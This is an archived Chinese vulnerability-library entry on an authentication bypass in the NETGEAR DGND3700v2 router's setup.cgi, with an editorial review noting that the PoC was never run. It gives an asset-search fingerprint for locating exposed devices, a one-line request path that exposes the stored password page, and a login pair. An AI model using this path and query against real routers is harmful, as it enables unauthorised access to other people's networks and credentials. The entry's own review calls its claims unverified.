---
source: "wy876 漏洞文库"
id: "vw-cad12c55a2d74e3b5845df2a"
entity_id: "ve-cad12c55a2d74e3b5845df2a"
schema_version: "1"
title: "NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞"
product: "NETGEAR DGND3700v2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "固件未给，读取passwordrecovered.htm"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/NETGEAR/NETGEARDGND3700v2%E8%B7%AF%E7%94%B1%E5%99%A8setup.cgi%E6%8E%A5%E5%8F%A3%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nfl28ku7srgz3zrl"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"DGND3700v2\""
---

# NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NETGEAR DGND3700v2
- 本文讨论：setup.cgi密码恢复页面认证绕过
- 版本、权限与配置前提：固件未给，读取passwordrecovered.htm
- 资料类型：简短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- admin/password可能只是样例或默认凭据，不能代表泄漏任意现场密码；缺响应
- frontmatter把Hunter web.title字段截为空
- 企业路由器产品定位无来源，型号不能替代受影响版本
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 密码恢复是否需启用及认证绕过细节待原文核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
NETGEAR DGND3700v2 是一款高效的企业路由器，NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。

# 二、影响版本
+ NETGEAR DGND3700v2

# 三、资产测绘
+ hunter`web.title="DGND3700v2"`

# 四、漏洞复现
```java
/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm
```


通过上述密码登录系统

`admin/password`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nfl28ku7srgz3zrl>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
